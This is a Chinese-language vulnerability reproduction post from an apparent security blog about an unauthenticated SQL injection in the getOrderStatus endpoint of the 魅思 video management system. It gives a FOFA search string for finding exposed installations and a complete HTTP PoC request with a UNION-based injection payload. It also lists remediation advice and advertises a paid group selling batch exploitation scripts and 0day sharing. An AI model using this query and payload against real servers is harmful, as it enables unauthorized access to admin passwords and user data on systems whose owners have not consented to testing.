#  「漏洞复现」魅思-视频管理系统 getOrderStatus SQL注入漏洞   
冷漠安全  冷漠安全   2024-10-07 11:56  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
魅思-视频管理系统是一款集成了视频管理、用户管理、手机端应用封装等功能的综合性视频管理系统。该系统不仅以其强大的视频管理功能、灵活的用户管理机制、便捷的手机端应用封装功能以及高安全性和现代化的界面设计，成为了市场上备受关注的视频管理系统之一。无论是对于专业的视频内容创作者还是对于需要视频管理功能的企业和个人用户来说，都是一个值得考虑的选择。  
  
0x03  
  
**漏洞威胁**  
  
魅思-视频管理系统 getOrderStatus 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="魅思-视频管理系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q43PFGWQAsq7tuUlrmCggcFxyEF6Pb0D78RdM6aNrXjdFvXC1Ic8Ta98mtjP6CtnOBkLpm5GLZqg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /api/getOrderStatus HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close


orderSn=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(VERSION() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL-- -
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q43PFGWQAsq7tuUlrmCggc6UbOIq85fpicPS4WoR8wDYuiacCg0YkljtQiaT0cANEGfeIdEKuIJ8CsA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q43PFGWQAsq7tuUlrmCggcAPj7LNibZnMKfpWNjvXnwo9Jic9icBXk5xZLibibxQsfv6yuY8Job4mm0IQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
使用预编译语句，所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。  
  
对进入数据库的特殊字符（'"@&*;等）进行转义处理，或编码转换。  
  
确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。  
  
过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q43PFGWQAsq7tuUlrmCggcluyY95jwlow0wl06UOLaWiaJDMibBkOicwg8YyBVO2SB51wI0iaqhnibqOg/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0q43PFGWQAsq7tuUlrmCggctT4eDE0Dp6QVG9ThxlJEuibHACickHj5RBISopgZTd3CVjm9BqkkySnA/640?wx_fmt=gif&from=appmsg "")  
  
